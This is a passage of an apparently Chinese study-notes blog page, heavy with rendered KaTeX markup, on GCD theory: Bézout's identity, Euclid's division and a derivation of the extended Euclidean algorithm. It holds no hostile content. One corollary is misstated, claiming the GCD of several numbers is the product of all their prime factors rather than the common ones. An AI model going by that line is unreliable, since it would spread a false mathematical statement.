class="mord"><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathbf">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathbf mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathbf">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathbf mtight">2&#x2F;3</span></span></span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.0824em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathbf">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathbf">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathbf mtight">1&#x2F;3</span></span></span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6861em;"></span><span class="mord"><span class="mord mathbf cjk_fallback">矛盾，原命题得证。</span></span></span><span class="mspace newline"></span></span></span></p>        </div>      </div>    </div><h1 id="重要定理及证明-gcd部分"><a href="#重要定理及证明-gcd部分" class="headerlink" title="重要定理及证明(gcd部分)"></a>重要定理及证明(gcd部分)</h1><h2 id="良序原理"><a href="#良序原理" class="headerlink" title="良序原理"></a>良序原理</h2><p><strong>自然数集的每个非空子集都有个最小元素。也称最小数原理。</strong></p><h2 id="定理1-8-贝祖定理"><a href="#定理1-8-贝祖定理" class="headerlink" title="定理1.8(贝祖定理):"></a>定理1.8(贝祖定理):</h2><p>这是GCD 的另一个定义，在高等数学中很有帮助，尤其是环论。<br><img src="/dong.github/images/0916-1.png"></p><h3 id="推论"><a href="#推论" class="headerlink" title="推论:"></a>推论:</h3><ul><li><strong>a 和 b 的任何公约数也会被GCD整除。</strong></li><li><strong>三个或更多数字的 GCD 等于所有数字的质因数的乘积</strong></li><li><strong>计算两个整数的 GCD 的 Euclid 算法足以计算任意多个整数的 GCD。</strong></li></ul><h2 id="定理1-9"><a href="#定理1-9" class="headerlink" title="定理1.9:"></a>定理1.9:</h2><p><img src="/dong.github/images/0915-7.jpg" alt="后续乘法逆元部分的重要铺垫"><br><b><font color="#b30b00">只有两个数互素的时候才有乘法逆元</font></b></p><h2 id="定理1-12："><a href="#定理1-12：" class="headerlink" title="定理1.12："></a>定理1.12：</h2><p><strong>欧几里得定理：</strong><br><img src="/dong.github/images/0915-5.png" alt="理解欧几里得除法的关键点"></p><h2 id="欧几里得除法："><a href="#欧几里得除法：" class="headerlink" title="欧几里得除法："></a>欧几里得除法：</h2><h3 id="基本定义与证明"><a href="#基本定义与证明" class="headerlink" title="基本定义与证明"></a>基本定义与证明</h3><p><img src="/dong.github/images/0915-6.png"><br><strong>于是由欧几里得定理，(a,b) &#x3D; (r0,r1) &#x3D; (r1,r2) &#x3D; …… &#x3D; (rn,0) &#x3D; rn</strong><br><strong>即gcd(a,b)&#x3D;gcd(b,a%b)</strong></p><h2 id="扩展的欧几里得算法"><a href="#扩展的欧几里得算法" class="headerlink" title="扩展的欧几里得算法"></a>扩展的欧几里得算法</h2><blockquote><p>GCD 可以表示为两个原始数字的线性组合，即两个数字之和，每个数字乘以一个整数（例如，21 &#x3D; 5 × 105 + （−2） × 252）。<br><strong>GCD 总是可以用这种方式表达的事实被称为 Bézout 贝祖恒等式</strong>。</p></blockquote><h3 id="定理1-13"><a href="#定理1-13" class="headerlink" title="定理1.13:"></a>定理1.13:</h3><p><img src="/dong.github/images/0916.jpg" alt="扩展欧几里得定理(exgcd算法)"></p><h3 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h3><p><strong>核心：核心思想是反复构造并求解一系列适于裴蜀定理（贝祖定理）的恒等式，进而得到s和t</strong></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-3ccccb70" role="button" aria-expanded="false" aria-controls="collapse-3ccccb70">        <div class="fold-arrow">▶</div>证明      </div>      <div class="fold-collapse collapse" id="collapse-3ccccb70">        <div class="fold-content">          <p>书P12-13：”以q为纽带，尝试计算s和t的数列。通过尝试和整理，得到定理。”<br>但是书上并没有说明s和t的数列是怎么找到的，这里将整个证明过程补全。<br><strong>一切都从贝祖恒等式开始：</strong><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>已知</mtext><mo>:</mo><msub><mi>r</mi><mi>n</mi></msub><mo>&#x3D;</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>&#x3D;</mo><mo stretchy="false">(</mo><mi>b</mi><mo separator="true">,</mo><mi>a</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>b</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>那么</mtext><mo>:</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>&#x3D;</mo><mo stretchy="false">(</mo><mi>b</mi><mo separator="true">,</mo><mi>a</mi><mo>−</mo><mi>b</mi><mo stretchy="false">⌊</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo stretchy="false">⌋</mo><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>那么由</mtext><mo>:</mo><msub><mi>s</mi><mi>n</mi></msub><mi>a</mi><mo>+</mo><msub><mi>t</mi><mi>n</mi></msub><mi>b</mi><mo>&#x3D;</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>联系递推式</mtext><mo>:</mo><msub><mi>s</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mi>b</mi><mo>+</mo><msub><mi>t</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>a</mi><mo>−</mo><mi>b</mi><mo stretchy="false">⌊</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo stretchy="false">⌋</mo><mo stretchy="false">)</mo><mo>&#x3D;</mo><mo stretchy="false">(</mo><mi>b</mi><mo separator="true">,</mo><mi>a</mi><mo>−</mo><mi>b</mi><mo stretchy="false">⌊</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo stretchy="false">⌋</mo><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>得到等式</mtext><mo>:</mo><msub><mi>s</mi><mi>n</mi></msub><mi>a</mi><mo>+</mo><msub><mi>t</mi><mi>n</mi></msub><mi>b</mi><mo>&#x3D;</mo><msub><mi>s</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mi>b</mi><mo>+</mo><msub><mi>t</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>a</mi><mo>−</mo><mi>b</mi><mo stretchy="false">⌊</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo stretchy="false">⌋</mo><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><mi>a</mi><mo stretchy="false">(</mo><msub><mi>s</mi><mi>n</mi></msub><mo>−</mo><msub><mi>t</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">)</mo><mo>+</mo><mi>b</mi><mo stretchy="false">(</mo><msub><mi>t</mi><mi>n</mi></msub><mo>−</mo><mo stretchy="false">(</mo><msub><mi>s</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>−</mo><msub><mi>t</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">⌊</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo stretchy="false">⌋</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><msub><mi>s</mi><mi>n</mi></msub><mo>&#x3D;</mo><msub><mi>t</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mspace linebreak="newline"></mspace><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext><msub><mi>t</mi><mi>n</mi></msub><mo>&#x3D;</mo><msub><mi>s</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>−</mo><msub><mi>t</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">⌊</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo stretchy="false">⌋</mo><mspace linebreak="newline"></mspace><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>t</mi><mi>n</mi></msub><mo>&#x3D;</mo><msub><mi>t</mi><mrow><mi>n</mi><mo>−</mo><mn>2</mn></mrow></msub><mo>−</mo><msub><mi>q</mi><mi>n</mi></msub><msub><mi>t</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>s</mi><mi>n</mi></msub><mo>&#x3D;</mo><msub><mi>s</mi><mrow><mi>n</mi><mo>−</mo><mn>2</mn></mrow></msub><mo>−</mo><msub><mi>q</mi><mi>n</mi></msub><msub><mi>s</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow></mstyle></mtd></mtr></mtable></mrow><mo separator="true">,</mo><mtext> </mtext><mtext> </mtext><mtext> </mtext><msub><mi>q</mi><mi>n</mi></msub><mo>&#x3D;</mo><mo stretchy="false">⌊</mo><msub><mi>r</mi><mrow><mi>n</mi><mo>−</mo><mn>2</mn></mrow></msub><mi mathvariant="normal">&#x2F;</mi><msub><mi>r</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">已知:r_n&#x3D;(a,b)&#x3D;(b,a,mod,b)\newline<br>那么:(a,b)&#x3D;(b,a-b \lfloor \frac{a}{b} \rfloor)\newline<br>那么由:s_na+t_nb&#x3D;(a,b)\newline<br>联系递推式:s_{n-1}b+t_{n-1}(a-b \lfloor \frac{a}{b} \rfloor)&#x3D;(b,a-b \lfloor \frac{a}{b} \rfloor)\newline<br>得到等式:s_na+t_nb&#x3D;s_{n-1}b+t_{n-1}(a-b \lfloor \frac{a}{b} \rfloor)\newline<br>\implies a(s_n-t_{n-1})+b(t_{n}-(s_{n-1}-t_{n-1}\lfloor \frac{a}{b} \rfloor))\newline<br>\implies s_n&#x3D;t_{n-1}\newline<br>\implies t_n&#x3D;s_{n-1}-t_{n-1}\lfloor \frac{a}{b} \rfloor\newline<br>\begin{cases}<br>t_n&#x3D;t_{n-2}-q_nt_{n-1}\newline<br>s_n&#x3D;s_{n-2}-q_ns_{n-1}\newline<br>\end{cases}<br>,,,,q_n&#x3D;\lfloor r_{n-2}&#x2F;r_{n-1} \rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">已知</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">那么</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mord mathnormal">b</span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">那么由</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">联系递推式</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9028em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mord mathnormal">b</span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mord mathnormal">b</span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">得到等式</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9028em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mord mathnormal">b</span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.549em;vertical-align:-0.024em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord 